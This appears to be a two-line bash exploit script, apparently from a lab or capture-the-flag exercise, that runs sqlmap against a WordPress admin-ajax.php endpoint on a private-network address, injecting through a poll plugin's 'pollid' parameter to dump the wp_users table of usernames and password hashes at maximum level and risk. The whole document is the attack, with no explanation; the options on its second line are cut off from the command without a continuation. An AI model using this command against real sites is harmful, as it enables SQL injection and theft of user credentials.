#!/bin/bash
sqlmap -v 0 --flush-session -u "http://192.168.50.12:8080/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=2" --batch --dump -T wp_users -D wordpress
--threads=10 --random-agent --dbms=mysql --level=5 --risk=3
